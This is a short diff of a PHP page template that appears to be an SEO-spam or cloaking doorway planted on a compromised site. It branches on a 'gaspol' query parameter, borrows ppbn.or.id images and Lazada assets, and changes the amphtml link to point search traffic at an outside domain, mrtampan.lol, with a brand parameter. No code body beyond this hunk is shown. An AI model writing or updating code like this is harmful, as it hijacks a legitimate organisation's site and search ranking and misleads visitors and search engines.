@@ -77,7 +77,7 @@ if (isset($_GET['gaspol'])) {
 <link rel="manifest" href="https://g.lazcdn.com/g/lzdfe/pwa-assets/5.0.7/manifest/id.json">
 <link rel="shortcut icon" href="https://ppbn.or.id/wp-content/uploads/2022/04/cropped-Group-192x192.png" />
 <link rel="canonical" href="<?php echo $urlPath ?>" />
-<link rel="amphtml" href="https://ppbn-oridd.web.app/?gaspol=<?php echo $BRANDS ?>" />
+<link rel="amphtml" href="https://mrtampan.lol/v1/?gaspol=<?php echo $BRANDS ?>" />
 <link rel="preload" href="https://ppbn.or.id/wp-content/uploads/elementor/thumbs/renewable-energy-generation-pmlyk8nu0y3h8k5erqtbfhmk4lwk9xxw5yhruwjs3k.jpg" as="image" />
 <link rel="preconnect dns-prefetch" href="https://cart.lazada.co.id" />
 <link rel="preconnect dns-prefetch" href="https://acs-m.lazada.co.id" />
